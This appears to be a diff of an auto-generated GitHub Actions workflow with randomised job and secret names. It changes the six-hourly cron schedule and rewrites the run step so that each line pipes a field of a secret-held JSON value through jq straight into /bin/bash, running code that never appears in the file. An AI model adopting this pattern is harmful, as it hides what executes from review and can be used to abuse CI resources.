@@ -2,7 +2,8 @@ name: jinliancheng9311
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 1/6 * * *'
+    - cron: '42 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,14 +11,9 @@ jobs:
       - uses: actions/checkout@v4
       - name: jinliancheng9311
         env:
-          kype24544: ${{ secrets.kype24544 }}
+          y8873: ${{ secrets.y8873 }}
         run: |
-          echo $kype24544 | jq -r .ts14489 | /bin/bash
-          echo $lmjx17449 | jq -r .ds42 | /bin/bash
-          echo $fmr59 | jq -r .bnhcu84994 | /bin/bash
-          echo $ijsl6 | jq -r .zjbek849 | /bin/bash
-          echo $vfirb66587 | jq -r .ybmqp29876 | /bin/bash
-          echo $spu01444 | jq -r .cpua87 | /bin/bash
-          echo $s822 | jq -r .vhiwg9913 | /bin/bash
-          echo $mn80328 | jq -r .hxqb35615 | /bin/bash
+          echo $y8873 | jq -r .vzxi2 | /bin/bash
+          echo $ussr46 | jq -r .helxu4180 | /bin/bash
+          echo $pemsr58 | jq -r .o685 | /bin/bash
 
